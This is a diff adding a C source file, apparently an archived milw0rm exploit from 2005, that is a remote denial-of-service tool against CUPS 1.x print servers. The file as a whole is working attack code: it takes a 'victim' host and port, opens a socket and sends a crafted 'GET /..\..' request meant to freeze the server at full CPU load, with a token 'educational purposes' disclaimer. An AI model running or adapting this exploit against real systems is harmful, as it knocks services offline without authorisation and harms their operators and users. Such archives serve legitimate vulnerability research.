@@ -1,0 +1,63 @@
+/* dl-cups.c v0.1
+ * CUPS server freeze and processor load "fuckup" exploit
+ * bug found and exploit coded by tracewar  (darklogic team)
+ * for educaional purposes only.
+ *****************************************************************
+ * greetz goes to:
+ * setuid, matan.
+ */
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <netdb.h>
+
+char EVIL[] = "\x2e\x2e\x5c\x2e\x2e";
+
+void usage(char *argv0) {
+	fprintf(stdout, "cups/1.x server freeze and remote cpu usage fuckup\n");
+	fprintf(stdout, "exploit coded and bug found by tracewar of darklogic\n\n");
+	fprintf(stdout, "usage: %s remote_host remote_port\n", argv0);
+	exit(0);
+}
+
+int main(int argc, char **argv) {
+	char	buffer[50] = "GET /";
+	int	sock;
+        struct	sockaddr_in	serv_addr;
+        struct	hostent	*crap;
+
+	if(argc != 3)
+		usage(argv[0]);
+
+	printf("# Making our evil buffer... ");	
+	snprintf(&buffer[5], 47, "%s", EVIL);        
+	strcat(buffer, "\r\n");
+	printf("(done)\n");
+
+        sock = socket(AF_INET, SOCK_STREAM, 0);
+        if(sock < 0)
+                return printf("# error creating socket.\n");
+        crap = gethostbyname(argv[1]);
+        if(crap == NULL)
+                return printf("# cant resolve the specified hostname: %s\n", argv[1]);
+        else
+                printf("# connecting to victim... ");
+
+        serv_addr.sin_family = AF_INET;
+        serv_addr.sin_port = htons(atoi(argv[2]));
+        bcopy((char *)crap->h_addr, (char *)&serv_addr.sin_addr.s_addr, crap->h_length);
+
+        if (connect(sock, &serv_addr, sizeof(serv_addr)) < 0)
+                return printf("(error)\n# check again %s:%d\n", argv[1], atoi(argv[2]));
+
+        printf("(done)\n# sending crafted string... ");
+        if( (send(sock, buffer, strlen(buffer), 0)) == -1 )
+                return printf("\n# error while sending the crafted string.!\n");
+	close(sock);
+        return puts("(done)\n# The server should be frozen now with 100\% cpu usage.");
+
+}
+
+// milw0rm.com [2005-09-05]
